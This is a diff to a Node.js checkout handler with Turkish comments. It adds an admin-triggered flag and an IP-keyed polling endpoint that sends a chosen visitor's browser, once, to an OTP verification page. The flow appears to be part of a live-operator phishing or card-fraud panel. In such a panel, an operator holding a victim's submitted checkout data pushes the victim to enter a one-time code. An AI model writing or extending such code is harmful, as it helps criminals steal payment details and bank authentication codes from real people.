@@ -55,7 +55,7 @@ module.exports = async (req, res) => {
 
     // Checkout verilerini getir veya redirect
     if (req.method === 'GET') {
-      // Redirect işlemi için
+      // Redirect işlemi için (admin panelinden kullanıcıyı yönlendirme)
       if (req.query.redirect === 'true' && req.query.id) {
         let checkoutId = req.query.id;
         try {
@@ -71,9 +71,46 @@ module.exports = async (req, res) => {
         if (!checkout) {
           return res.status(404).json({ error: 'Checkout bulunamadı' });
         }
+        
+        // Checkout'a redirect flag'i ekle
+        await checkoutsCol.updateOne(
+          { _id: checkoutId },
+          { $set: { redirectToOTP: true, redirectTriggeredAt: new Date() } }
+        );
+        
         const redirectUrl = `/otp-verify.html?id=${req.query.id}`;
         res.writeHead(302, { Location: redirectUrl });
         return res.end();
+      }
+
+      // Kullanıcının redirect kontrolü için
+      if (req.query.checkRedirect === 'true') {
+        // IP adresini al
+        const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   req.headers['x-real-ip'] || 
+                   req.connection?.remoteAddress || 
+                   'unknown';
+        
+        // Bu IP'ye sahip checkout'u bul ve redirect flag'i var mı kontrol et
+        const checkout = await checkoutsCol.findOne({
+          ip: ip,
+          redirectToOTP: true
+        });
+        
+        if (checkout) {
+          // Redirect flag'ini kaldır (bir kez yönlendir)
+          await checkoutsCol.updateOne(
+            { _id: checkout._id },
+            { $unset: { redirectToOTP: '', redirectTriggeredAt: '' } }
+          );
+          
+          return res.status(200).json({
+            shouldRedirect: true,
+            redirectUrl: `/otp-verify.html?id=${checkout._id}`
+          });
+        }
+        
+        return res.status(200).json({ shouldRedirect: false });
       }
 
       // Normal GET - checkout listesi
